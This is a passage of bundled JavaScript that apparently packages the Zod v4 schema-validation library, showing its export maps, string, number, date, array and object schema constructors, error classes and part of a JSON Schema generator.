    return this.ctx.counter;
  }
  set counter(value) {
    this.ctx.counter = value;
  }
  get seen() {
    return this.ctx.seen;
  }
  constructor(params) {
    let normalizedTarget = params?.target ?? "draft-2020-12";
    if (normalizedTarget === "draft-4")
      normalizedTarget = "draft-04";
    if (normalizedTarget === "draft-7")
      normalizedTarget = "draft-07";
    this.ctx = initializeContext({
      processors: allProcessors,
      target: normalizedTarget,
      ...params?.metadata && { metadata: params.metadata },
      ...params?.unrepresentable && { unrepresentable: params.unrepresentable },
      ...params?.override && { override: params.override },
      ...params?.io && { io: params.io }
    });
  }
  process(schema, _params = { path: [], schemaPath: [] }) {
    return process2(schema, this.ctx, _params);
  }
  emit(schema, _params) {
    if (_params) {
      if (_params.cycles)
        this.ctx.cycles = _params.cycles;
      if (_params.reused)
        this.ctx.reused = _params.reused;
      if (_params.external)
        this.ctx.external = _params.external;
    }
    extractDefs(this.ctx, schema);
    const result = finalize(this.ctx, schema);
    const { "~standard": _, ...plainResult } = result;
    return plainResult;
  }
}
// node_modules/zod/v4/core/json-schema.js
var exports_json_schema = {};
// node_modules/zod/v4/classic/schemas.js
var exports_schemas2 = {};
__export(exports_schemas2, {
  xor: () => xor,
  xid: () => xid2,
  void: () => _void2,
  uuidv7: () => uuidv7,
  uuidv6: () => uuidv6,
  uuidv4: () => uuidv4,
  uuid: () => uuid2,
  url: () => url,
  unknown: () => unknown,
  union: () => union,
  undefined: () => _undefined3,
  ulid: () => ulid2,
  uint64: () => uint64,
  uint32: () => uint32,
  tuple: () => tuple,
  transform: () => transform,
  templateLiteral: () => templateLiteral,
  symbol: () => symbol,
  superRefine: () => superRefine,
  success: () => success,
  stringbool: () => stringbool,
  stringFormat: () => stringFormat,
  string: () => string2,
  strictObject: () => strictObject,
  set: () => set,
  refine: () => refine,
  record: () => record,
  readonly: () => readonly,
  promise: () => promise,
  preprocess: () => preprocess,
  prefault: () => prefault,
  pipe: () => pipe,
  partialRecord: () => partialRecord,
  optional: () => optional,
  object: () => object,
  number: () => number2,
  nullish: () => nullish2,
  nullable: () => nullable,
  null: () => _null3,
  nonoptional: () => nonoptional,
  never: () => never,
  nativeEnum: () => nativeEnum,
  nanoid: () => nanoid2,
  nan: () => nan,
  meta: () => meta2,
  map: () => map,
  mac: () => mac2,
  looseRecord: () => looseRecord,
  looseObject: () => looseObject,
  literal: () => literal,
  lazy: () => lazy,
  ksuid: () => ksuid2,
  keyof: () => keyof,
  jwt: () => jwt,
  json: () => json,
  ipv6: () => ipv62,
  ipv4: () => ipv42,
  intersection: () => intersection,
  int64: () => int64,
  int32: () => int32,
  int: () => int,
  instanceof: () => _instanceof,
  httpUrl: () => httpUrl,
  hostname: () => hostname2,
  hex: () => hex2,
  hash: () => hash,
  guid: () => guid2,
  function: () => _function,
  float64: () => float64,
  float32: () => float32,
  file: () => file,
  exactOptional: () => exactOptional,
  enum: () => _enum2,
  emoji: () => emoji2,
  email: () => email2,
  e164: () => e1642,
  discriminatedUnion: () => discriminatedUnion,
  describe: () => describe2,
  date: () => date3,
  custom: () => custom,
  cuid2: () => cuid22,
  cuid: () => cuid3,
  codec: () => codec,
  cidrv6: () => cidrv62,
  cidrv4: () => cidrv42,
  check: () => check,
  catch: () => _catch2,
  boolean: () => boolean2,
  bigint: () => bigint2,
  base64url: () => base64url2,
  base64: () => base642,
  array: () => array,
  any: () => any,
  _function: () => _function,
  _default: () => _default2,
  _ZodString: () => _ZodString,
  ZodXor: () => ZodXor,
  ZodXID: () => ZodXID,
  ZodVoid: () => ZodVoid,
  ZodUnknown: () => ZodUnknown,
  ZodUnion: () => ZodUnion,
  ZodUndefined: () => ZodUndefined,
  ZodUUID: () => ZodUUID,
  ZodURL: () => ZodURL,
  ZodULID: () => ZodULID,
  ZodType: () => ZodType,
  ZodTuple: () => ZodTuple,
  ZodTransform: () => ZodTransform,
  ZodTemplateLiteral: () => ZodTemplateLiteral,
  ZodSymbol: () => ZodSymbol,
  ZodSuccess: () => ZodSuccess,
  ZodStringFormat: () => ZodStringFormat,
  ZodString: () => ZodString,
  ZodSet: () => ZodSet,
  ZodRecord: () => ZodRecord,
  ZodReadonly: () => ZodReadonly,
  ZodPromise: () => ZodPromise,
  ZodPrefault: () => ZodPrefault,
  ZodPipe: () => ZodPipe,
  ZodOptional: () => ZodOptional,
  ZodObject: () => ZodObject,
  ZodNumberFormat: () => ZodNumberFormat,
  ZodNumber: () => ZodNumber,
  ZodNullable: () => ZodNullable,
  ZodNull: () => ZodNull,
  ZodNonOptional: () => ZodNonOptional,
  ZodNever: () => ZodNever,
  ZodNanoID: () => ZodNanoID,
  ZodNaN: () => ZodNaN,
  ZodMap: () => ZodMap,
  ZodMAC: () => ZodMAC,
  ZodLiteral: () => ZodLiteral,
  ZodLazy: () => ZodLazy,
  ZodKSUID: () => ZodKSUID,
  ZodJWT: () => ZodJWT,
  ZodIntersection: () => ZodIntersection,
  ZodIPv6: () => ZodIPv6,
  ZodIPv4: () => ZodIPv4,
  ZodGUID: () => ZodGUID,
  ZodFunction: () => ZodFunction,
  ZodFile: () => ZodFile,
  ZodExactOptional: () => ZodExactOptional,
  ZodEnum: () => ZodEnum,
  ZodEmoji: () => ZodEmoji,
  ZodEmail: () => ZodEmail,
  ZodE164: () => ZodE164,
  ZodDiscriminatedUnion: () => ZodDiscriminatedUnion,
  ZodDefault: () => ZodDefault,
  ZodDate: () => ZodDate,
  ZodCustomStringFormat: () => ZodCustomStringFormat,
  ZodCustom: () => ZodCustom,
  ZodCodec: () => ZodCodec,
  ZodCatch: () => ZodCatch,
  ZodCUID2: () => ZodCUID2,
  ZodCUID: () => ZodCUID,
  ZodCIDRv6: () => ZodCIDRv6,
  ZodCIDRv4: () => ZodCIDRv4,
  ZodBoolean: () => ZodBoolean,
  ZodBigIntFormat: () => ZodBigIntFormat,
  ZodBigInt: () => ZodBigInt,
  ZodBase64URL: () => ZodBase64URL,
  ZodBase64: () => ZodBase64,
  ZodArray: () => ZodArray,
  ZodAny: () => ZodAny
});

// node_modules/zod/v4/classic/checks.js
var exports_checks2 = {};
__export(exports_checks2, {
  uppercase: () => _uppercase,
  trim: () => _trim,
  toUpperCase: () => _toUpperCase,
  toLowerCase: () => _toLowerCase,
  startsWith: () => _startsWith,
  slugify: () => _slugify,
  size: () => _size,
  regex: () => _regex,
  property: () => _property,
  positive: () => _positive,
  overwrite: () => _overwrite,
  normalize: () => _normalize,
  nonpositive: () => _nonpositive,
  nonnegative: () => _nonnegative,
  negative: () => _negative,
  multipleOf: () => _multipleOf,
  minSize: () => _minSize,
  minLength: () => _minLength,
  mime: () => _mime,
  maxSize: () => _maxSize,
  maxLength: () => _maxLength,
  lte: () => _lte,
  lt: () => _lt,
  lowercase: () => _lowercase,
  length: () => _length,
  includes: () => _includes,
  gte: () => _gte,
  gt: () => _gt,
  endsWith: () => _endsWith
});

// node_modules/zod/v4/classic/iso.js
var exports_iso = {};
__export(exports_iso, {
  time: () => time2,
  duration: () => duration2,
  datetime: () => datetime2,
  date: () => date2,
  ZodISOTime: () => ZodISOTime,
  ZodISODuration: () => ZodISODuration,
  ZodISODateTime: () => ZodISODateTime,
  ZodISODate: () => ZodISODate
});
var ZodISODateTime = /* @__PURE__ */ $constructor("ZodISODateTime", (inst, def) => {
  $ZodISODateTime.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function datetime2(params) {
  return _isoDateTime(ZodISODateTime, params);
}
var ZodISODate = /* @__PURE__ */ $constructor("ZodISODate", (inst, def) => {
  $ZodISODate.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function date2(params) {
  return _isoDate(ZodISODate, params);
}
var ZodISOTime = /* @__PURE__ */ $constructor("ZodISOTime", (inst, def) => {
  $ZodISOTime.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function time2(params) {
  return _isoTime(ZodISOTime, params);
}
var ZodISODuration = /* @__PURE__ */ $constructor("ZodISODuration", (inst, def) => {
  $ZodISODuration.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function duration2(params) {
  return _isoDuration(ZodISODuration, params);
}

// node_modules/zod/v4/classic/errors.js
var initializer2 = (inst, issues) => {
  $ZodError.init(inst, issues);
  inst.name = "ZodError";
  Object.defineProperties(inst, {
    format: {
      value: (mapper) => formatError(inst, mapper)
    },
    flatten: {
      value: (mapper) => flattenError(inst, mapper)
    },
    addIssue: {
      value: (issue2) => {
        inst.issues.push(issue2);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer, 2);
      }
    },
    addIssues: {
      value: (issues2) => {
        inst.issues.push(...issues2);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer, 2);
      }
    },
    isEmpty: {
      get() {
        return inst.issues.length === 0;
      }
    }
  });
};
var ZodError = $constructor("ZodError", initializer2);
var ZodRealError = $constructor("ZodError", initializer2, {
  Parent: Error
});

// node_modules/zod/v4/classic/parse.js
var parse3 = /* @__PURE__ */ _parse(ZodRealError);
var parseAsync2 = /* @__PURE__ */ _parseAsync(ZodRealError);
var safeParse2 = /* @__PURE__ */ _safeParse(ZodRealError);
var safeParseAsync2 = /* @__PURE__ */ _safeParseAsync(ZodRealError);
var encode2 = /* @__PURE__ */ _encode(ZodRealError);
var decode2 = /* @__PURE__ */ _decode(ZodRealError);
var encodeAsync2 = /* @__PURE__ */ _encodeAsync(ZodRealError);
var decodeAsync2 = /* @__PURE__ */ _decodeAsync(ZodRealError);
var safeEncode2 = /* @__PURE__ */ _safeEncode(ZodRealError);
var safeDecode2 = /* @__PURE__ */ _safeDecode(ZodRealError);
var safeEncodeAsync2 = /* @__PURE__ */ _safeEncodeAsync(ZodRealError);
var safeDecodeAsync2 = /* @__PURE__ */ _safeDecodeAsync(ZodRealError);

// node_modules/zod/v4/classic/schemas.js
var ZodType = /* @__PURE__ */ $constructor("ZodType", (inst, def) => {
  $ZodType.init(inst, def);
  Object.assign(inst["~standard"], {
    jsonSchema: {
      input: createStandardJSONSchemaMethod(inst, "input"),
      output: createStandardJSONSchemaMethod(inst, "output")
    }
  });
  inst.toJSONSchema = createToJSONSchemaMethod(inst, {});
  inst.def = def;
  inst.type = def.type;
  Object.defineProperty(inst, "_def", { value: def });
  inst.check = (...checks2) => {
    return inst.clone(exports_util.mergeDefs(def, {
      checks: [
        ...def.checks ?? [],
        ...checks2.map((ch) => typeof ch === "function" ? { _zod: { check: ch, def: { check: "custom" }, onattach: [] } } : ch)
      ]
    }), {
      parent: true
    });
  };
  inst.with = inst.check;
  inst.clone = (def2, params) => clone(inst, def2, params);
  inst.brand = () => inst;
  inst.register = (reg, meta2) => {
    reg.add(inst, meta2);
    return inst;
  };
  inst.parse = (data, params) => parse3(inst, data, params, { callee: inst.parse });
  inst.safeParse = (data, params) => safeParse2(inst, data, params);
  inst.parseAsync = async (data, params) => parseAsync2(inst, data, params, { callee: inst.parseAsync });
  inst.safeParseAsync = async (data, params) => safeParseAsync2(inst, data, params);
  inst.spa = inst.safeParseAsync;
  inst.encode = (data, params) => encode2(inst, data, params);
  inst.decode = (data, params) => decode2(inst, data, params);
  inst.encodeAsync = async (data, params) => encodeAsync2(inst, data, params);
  inst.decodeAsync = async (data, params) => decodeAsync2(inst, data, params);
  inst.safeEncode = (data, params) => safeEncode2(inst, data, params);
  inst.safeDecode = (data, params) => safeDecode2(inst, data, params);
  inst.safeEncodeAsync = async (data, params) => safeEncodeAsync2(inst, data, params);
  inst.safeDecodeAsync = async (data, params) => safeDecodeAsync2(inst, data, params);
  inst.refine = (check, params) => inst.check(refine(check, params));
  inst.superRefine = (refinement) => inst.check(superRefine(refinement));
  inst.overwrite = (fn) => inst.check(_overwrite(fn));
  inst.optional = () => optional(inst);
  inst.exactOptional = () => exactOptional(inst);
  inst.nullable = () => nullable(inst);
  inst.nullish = () => optional(nullable(inst));
  inst.nonoptional = (params) => nonoptional(inst, params);
  inst.array = () => array(inst);
  inst.or = (arg) => union([inst, arg]);
  inst.and = (arg) => intersection(inst, arg);
  inst.transform = (tx) => pipe(inst, transform(tx));
  inst.default = (def2) => _default2(inst, def2);
  inst.prefault = (def2) => prefault(inst, def2);
  inst.catch = (params) => _catch2(inst, params);
  inst.pipe = (target) => pipe(inst, target);
  inst.readonly = () => readonly(inst);
  inst.describe = (description) => {
    const cl = inst.clone();
    globalRegistry.add(cl, { description });
    return cl;
  };
  Object.defineProperty(inst, "description", {
    get() {
      return globalRegistry.get(inst)?.description;
    },
    configurable: true
  });
  inst.meta = (...args) => {
    if (args.length === 0) {
      return globalRegistry.get(inst);
    }
    const cl = inst.clone();
    globalRegistry.add(cl, args[0]);
    return cl;
  };
  inst.isOptional = () => inst.safeParse(undefined).success;
  inst.isNullable = () => inst.safeParse(null).success;
  inst.apply = (fn) => fn(inst);
  return inst;
});
var _ZodString = /* @__PURE__ */ $constructor("_ZodString", (inst, def) => {
  $ZodString.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => stringProcessor(inst, ctx, json, params);
  const bag = inst._zod.bag;
  inst.format = bag.format ?? null;
  inst.minLength = bag.minimum ?? null;
  inst.maxLength = bag.maximum ?? null;
  inst.regex = (...args) => inst.check(_regex(...args));
  inst.includes = (...args) => inst.check(_includes(...args));
  inst.startsWith = (...args) => inst.check(_startsWith(...args));
  inst.endsWith = (...args) => inst.check(_endsWith(...args));
  inst.min = (...args) => inst.check(_minLength(...args));
  inst.max = (...args) => inst.check(_maxLength(...args));
  inst.length = (...args) => inst.check(_length(...args));
  inst.nonempty = (...args) => inst.check(_minLength(1, ...args));
  inst.lowercase = (params) => inst.check(_lowercase(params));
  inst.uppercase = (params) => inst.check(_uppercase(params));
  inst.trim = () => inst.check(_trim());
  inst.normalize = (...args) => inst.check(_normalize(...args));
  inst.toLowerCase = () => inst.check(_toLowerCase());
  inst.toUpperCase = () => inst.check(_toUpperCase());
  inst.slugify = () => inst.check(_slugify());
});
var ZodString = /* @__PURE__ */ $constructor("ZodString", (inst, def) => {
  $ZodString.init(inst, def);
  _ZodString.init(inst, def);
  inst.email = (params) => inst.check(_email(ZodEmail, params));
  inst.url = (params) => inst.check(_url(ZodURL, params));
  inst.jwt = (params) => inst.check(_jwt(ZodJWT, params));
  inst.emoji = (params) => inst.check(_emoji2(ZodEmoji, params));
  inst.guid = (params) => inst.check(_guid(ZodGUID, params));
  inst.uuid = (params) => inst.check(_uuid(ZodUUID, params));
  inst.uuidv4 = (params) => inst.check(_uuidv4(ZodUUID, params));
  inst.uuidv6 = (params) => inst.check(_uuidv6(ZodUUID, params));
  inst.uuidv7 = (params) => inst.check(_uuidv7(ZodUUID, params));
  inst.nanoid = (params) => inst.check(_nanoid(ZodNanoID, params));
  inst.guid = (params) => inst.check(_guid(ZodGUID, params));
  inst.cuid = (params) => inst.check(_cuid(ZodCUID, params));
  inst.cuid2 = (params) => inst.check(_cuid2(ZodCUID2, params));
  inst.ulid = (params) => inst.check(_ulid(ZodULID, params));
  inst.base64 = (params) => inst.check(_base64(ZodBase64, params));
  inst.base64url = (params) => inst.check(_base64url(ZodBase64URL, params));
  inst.xid = (params) => inst.check(_xid(ZodXID, params));
  inst.ksuid = (params) => inst.check(_ksuid(ZodKSUID, params));
  inst.ipv4 = (params) => inst.check(_ipv4(ZodIPv4, params));
  inst.ipv6 = (params) => inst.check(_ipv6(ZodIPv6, params));
  inst.cidrv4 = (params) => inst.check(_cidrv4(ZodCIDRv4, params));
  inst.cidrv6 = (params) => inst.check(_cidrv6(ZodCIDRv6, params));
  inst.e164 = (params) => inst.check(_e164(ZodE164, params));
  inst.datetime = (params) => inst.check(datetime2(params));
  inst.date = (params) => inst.check(date2(params));
  inst.time = (params) => inst.check(time2(params));
  inst.duration = (params) => inst.check(duration2(params));
});
function string2(params) {
  return _string(ZodString, params);
}
var ZodStringFormat = /* @__PURE__ */ $constructor("ZodStringFormat", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  _ZodString.init(inst, def);
});
var ZodEmail = /* @__PURE__ */ $constructor("ZodEmail", (inst, def) => {
  $ZodEmail.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function email2(params) {
  return _email(ZodEmail, params);
}
var ZodGUID = /* @__PURE__ */ $constructor("ZodGUID", (inst, def) => {
  $ZodGUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function guid2(params) {
  return _guid(ZodGUID, params);
}
var ZodUUID = /* @__PURE__ */ $constructor("ZodUUID", (inst, def) => {
  $ZodUUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function uuid2(params) {
  return _uuid(ZodUUID, params);
}
function uuidv4(params) {
  return _uuidv4(ZodUUID, params);
}
function uuidv6(params) {
  return _uuidv6(ZodUUID, params);
}
function uuidv7(params) {
  return _uuidv7(ZodUUID, params);
}
var ZodURL = /* @__PURE__ */ $constructor("ZodURL", (inst, def) => {
  $ZodURL.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function url(params) {
  return _url(ZodURL, params);
}
function httpUrl(params) {
  return _url(ZodURL, {
    protocol: /^https?$/,
    hostname: exports_regexes.domain,
    ...exports_util.normalizeParams(params)
  });
}
var ZodEmoji = /* @__PURE__ */ $constructor("ZodEmoji", (inst, def) => {
  $ZodEmoji.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function emoji2(params) {
  return _emoji2(ZodEmoji, params);
}
var ZodNanoID = /* @__PURE__ */ $constructor("ZodNanoID", (inst, def) => {
  $ZodNanoID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function nanoid2(params) {
  return _nanoid(ZodNanoID, params);
}
var ZodCUID = /* @__PURE__ */ $constructor("ZodCUID", (inst, def) => {
  $ZodCUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cuid3(params) {
  return _cuid(ZodCUID, params);
}
var ZodCUID2 = /* @__PURE__ */ $constructor("ZodCUID2", (inst, def) => {
  $ZodCUID2.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cuid22(params) {
  return _cuid2(ZodCUID2, params);
}
var ZodULID = /* @__PURE__ */ $constructor("ZodULID", (inst, def) => {
  $ZodULID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ulid2(params) {
  return _ulid(ZodULID, params);
}
var ZodXID = /* @__PURE__ */ $constructor("ZodXID", (inst, def) => {
  $ZodXID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function xid2(params) {
  return _xid(ZodXID, params);
}
var ZodKSUID = /* @__PURE__ */ $constructor("ZodKSUID", (inst, def) => {
  $ZodKSUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ksuid2(params) {
  return _ksuid(ZodKSUID, params);
}
var ZodIPv4 = /* @__PURE__ */ $constructor("ZodIPv4", (inst, def) => {
  $ZodIPv4.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ipv42(params) {
  return _ipv4(ZodIPv4, params);
}
var ZodMAC = /* @__PURE__ */ $constructor("ZodMAC", (inst, def) => {
  $ZodMAC.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function mac2(params) {
  return _mac(ZodMAC, params);
}
var ZodIPv6 = /* @__PURE__ */ $constructor("ZodIPv6", (inst, def) => {
  $ZodIPv6.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function ipv62(params) {
  return _ipv6(ZodIPv6, params);
}
var ZodCIDRv4 = /* @__PURE__ */ $constructor("ZodCIDRv4", (inst, def) => {
  $ZodCIDRv4.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cidrv42(params) {
  return _cidrv4(ZodCIDRv4, params);
}
var ZodCIDRv6 = /* @__PURE__ */ $constructor("ZodCIDRv6", (inst, def) => {
  $ZodCIDRv6.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function cidrv62(params) {
  return _cidrv6(ZodCIDRv6, params);
}
var ZodBase64 = /* @__PURE__ */ $constructor("ZodBase64", (inst, def) => {
  $ZodBase64.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function base642(params) {
  return _base64(ZodBase64, params);
}
var ZodBase64URL = /* @__PURE__ */ $constructor("ZodBase64URL", (inst, def) => {
  $ZodBase64URL.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function base64url2(params) {
  return _base64url(ZodBase64URL, params);
}
var ZodE164 = /* @__PURE__ */ $constructor("ZodE164", (inst, def) => {
  $ZodE164.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function e1642(params) {
  return _e164(ZodE164, params);
}
var ZodJWT = /* @__PURE__ */ $constructor("ZodJWT", (inst, def) => {
  $ZodJWT.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function jwt(params) {
  return _jwt(ZodJWT, params);
}
var ZodCustomStringFormat = /* @__PURE__ */ $constructor("ZodCustomStringFormat", (inst, def) => {
  $ZodCustomStringFormat.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function stringFormat(format, fnOrRegex, _params = {}) {
  return _stringFormat(ZodCustomStringFormat, format, fnOrRegex, _params);
}
function hostname2(_params) {
  return _stringFormat(ZodCustomStringFormat, "hostname", exports_regexes.hostname, _params);
}
function hex2(_params) {
  return _stringFormat(ZodCustomStringFormat, "hex", exports_regexes.hex, _params);
}
function hash(alg, params) {
  const enc = params?.enc ?? "hex";
  const format = `${alg}_${enc}`;
  const regex = exports_regexes[format];
  if (!regex)
    throw new Error(`Unrecognized hash format: ${format}`);
  return _stringFormat(ZodCustomStringFormat, format, regex, params);
}
var ZodNumber = /* @__PURE__ */ $constructor("ZodNumber", (inst, def) => {
  $ZodNumber.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => numberProcessor(inst, ctx, json, params);
  inst.gt = (value, params) => inst.check(_gt(value, params));
  inst.gte = (value, params) => inst.check(_gte(value, params));
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.lt = (value, params) => inst.check(_lt(value, params));
  inst.lte = (value, params) => inst.check(_lte(value, params));
  inst.max = (value, params) => inst.check(_lte(value, params));
  inst.int = (params) => inst.check(int(params));
  inst.safe = (params) => inst.check(int(params));
  inst.positive = (params) => inst.check(_gt(0, params));
  inst.nonnegative = (params) => inst.check(_gte(0, params));
  inst.negative = (params) => inst.check(_lt(0, params));
  inst.nonpositive = (params) => inst.check(_lte(0, params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf(value, params));
  inst.step = (value, params) => inst.check(_multipleOf(value, params));
  inst.finite = () => inst;
  const bag = inst._zod.bag;
  inst.minValue = Math.max(bag.minimum ?? Number.NEGATIVE_INFINITY, bag.exclusiveMinimum ?? Number.NEGATIVE_INFINITY) ?? null;
  inst.maxValue = Math.min(bag.maximum ?? Number.POSITIVE_INFINITY, bag.exclusiveMaximum ?? Number.POSITIVE_INFINITY) ?? null;
  inst.isInt = (bag.format ?? "").includes("int") || Number.isSafeInteger(bag.multipleOf ?? 0.5);
  inst.isFinite = true;
  inst.format = bag.format ?? null;
});
function number2(params) {
  return _number(ZodNumber, params);
}
var ZodNumberFormat = /* @__PURE__ */ $constructor("ZodNumberFormat", (inst, def) => {
  $ZodNumberFormat.init(inst, def);
  ZodNumber.init(inst, def);
});
function int(params) {
  return _int(ZodNumberFormat, params);
}
function float32(params) {
  return _float32(ZodNumberFormat, params);
}
function float64(params) {
  return _float64(ZodNumberFormat, params);
}
function int32(params) {
  return _int32(ZodNumberFormat, params);
}
function uint32(params) {
  return _uint32(ZodNumberFormat, params);
}
var ZodBoolean = /* @__PURE__ */ $constructor("ZodBoolean", (inst, def) => {
  $ZodBoolean.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => booleanProcessor(inst, ctx, json, params);
});
function boolean2(params) {
  return _boolean(ZodBoolean, params);
}
var ZodBigInt = /* @__PURE__ */ $constructor("ZodBigInt", (inst, def) => {
  $ZodBigInt.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => bigintProcessor(inst, ctx, json, params);
  inst.gte = (value, params) => inst.check(_gte(value, params));
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.gt = (value, params) => inst.check(_gt(value, params));
  inst.gte = (value, params) => inst.check(_gte(value, params));
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.lt = (value, params) => inst.check(_lt(value, params));
  inst.lte = (value, params) => inst.check(_lte(value, params));
  inst.max = (value, params) => inst.check(_lte(value, params));
  inst.positive = (params) => inst.check(_gt(BigInt(0), params));
  inst.negative = (params) => inst.check(_lt(BigInt(0), params));
  inst.nonpositive = (params) => inst.check(_lte(BigInt(0), params));
  inst.nonnegative = (params) => inst.check(_gte(BigInt(0), params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf(value, params));
  const bag = inst._zod.bag;
  inst.minValue = bag.minimum ?? null;
  inst.maxValue = bag.maximum ?? null;
  inst.format = bag.format ?? null;
});
function bigint2(params) {
  return _bigint(ZodBigInt, params);
}
var ZodBigIntFormat = /* @__PURE__ */ $constructor("ZodBigIntFormat", (inst, def) => {
  $ZodBigIntFormat.init(inst, def);
  ZodBigInt.init(inst, def);
});
function int64(params) {
  return _int64(ZodBigIntFormat, params);
}
function uint64(params) {
  return _uint64(ZodBigIntFormat, params);
}
var ZodSymbol = /* @__PURE__ */ $constructor("ZodSymbol", (inst, def) => {
  $ZodSymbol.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => symbolProcessor(inst, ctx, json, params);
});
function symbol(params) {
  return _symbol(ZodSymbol, params);
}
var ZodUndefined = /* @__PURE__ */ $constructor("ZodUndefined", (inst, def) => {
  $ZodUndefined.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => undefinedProcessor(inst, ctx, json, params);
});
function _undefined3(params) {
  return _undefined2(ZodUndefined, params);
}
var ZodNull = /* @__PURE__ */ $constructor("ZodNull", (inst, def) => {
  $ZodNull.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nullProcessor(inst, ctx, json, params);
});
function _null3(params) {
  return _null2(ZodNull, params);
}
var ZodAny = /* @__PURE__ */ $constructor("ZodAny", (inst, def) => {
  $ZodAny.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => anyProcessor(inst, ctx, json, params);
});
function any() {
  return _any(ZodAny);
}
var ZodUnknown = /* @__PURE__ */ $constructor("ZodUnknown", (inst, def) => {
  $ZodUnknown.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => unknownProcessor(inst, ctx, json, params);
});
function unknown() {
  return _unknown(ZodUnknown);
}
var ZodNever = /* @__PURE__ */ $constructor("ZodNever", (inst, def) => {
  $ZodNever.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => neverProcessor(inst, ctx, json, params);
});
function never(params) {
  return _never(ZodNever, params);
}
var ZodVoid = /* @__PURE__ */ $constructor("ZodVoid", (inst, def) => {
  $ZodVoid.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => voidProcessor(inst, ctx, json, params);
});
function _void2(params) {
  return _void(ZodVoid, params);
}
var ZodDate = /* @__PURE__ */ $constructor("ZodDate", (inst, def) => {
  $ZodDate.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => dateProcessor(inst, ctx, json, params);
  inst.min = (value, params) => inst.check(_gte(value, params));
  inst.max = (value, params) => inst.check(_lte(value, params));
  const c = inst._zod.bag;
  inst.minDate = c.minimum ? new Date(c.minimum) : null;
  inst.maxDate = c.maximum ? new Date(c.maximum) : null;
});
function date3(params) {
  return _date(ZodDate, params);
}
var ZodArray = /* @__PURE__ */ $constructor("ZodArray", (inst, def) => {
  $ZodArray.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => arrayProcessor(inst, ctx, json, params);
  inst.element = def.element;
  inst.min = (minLength, params) => inst.check(_minLength(minLength, params));
  inst.nonempty = (params) => inst.check(_minLength(1, params));
  inst.max = (maxLength, params) => inst.check(_maxLength(maxLength, params));
  inst.length = (len, params) => inst.check(_length(len, params));
  inst.unwrap = () => inst.element;
});
function array(element, params) {
  return _array(ZodArray, element, params);
}
function keyof(schema) {
  const shape = schema._zod.def.shape;
  return _enum2(Object.keys(shape));
}
var ZodObject = /* @__PURE__ */ $constructor("ZodObject", (inst, def) => {
  $ZodObjectJIT.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => objectProcessor(inst, ctx, json, params);
  exports_util.defineLazy(inst, "shape", () => {
    return def.shape;
  });
  inst.keyof = () => _enum2(Object.keys(inst._zod.def.shape));
  inst.catchall = (catchall) => inst.clone({ ...inst._zod.def, catchall });
  inst.passthrough = () => inst.clone({ ...inst._zod.def, catchall: unknown() });
  inst.loose = () => inst.clone({ ...inst._zod.def, catchall: unknown() });
  inst.strict = () => inst.clone({ ...inst._zod.def, catchall: never() });
  inst.strip = () => inst.clone({ ...inst._zod.def, catchall: undefined });
  inst.extend = (incoming) => {
    return exports_util.extend(inst, incoming);
  };
  inst.safeExtend = (incoming) => {
    return exports_util.safeExtend(inst, incoming);
  };
  inst.merge = (other) => exports_util.merge(inst, other);
  inst.pick = (mask) => exports_util.pick(inst, mask);
  inst.omit = (mask) => exports_util.omit(inst, mask);
  inst.partial = (...args) => exports_util.partial(ZodOptional, inst, args[0]);
  inst.required = (...args) => exports_util.required(ZodNonOptional, inst, args[0]);
});
function object(shape, params) {
  const def = {
    type: "object",
    shape: shape ?? {},
    ...exports_util.normalizeParams(params)
  };
  return new ZodObject(def);
}
function strictObject(shape, params) {
  return new ZodObject({
    type: "object",
    shape,
    catchall: never(),
    ...exports_util.normalizeParams(params)
  });
}
function looseObject(shape, params) {
  return new ZodObject({
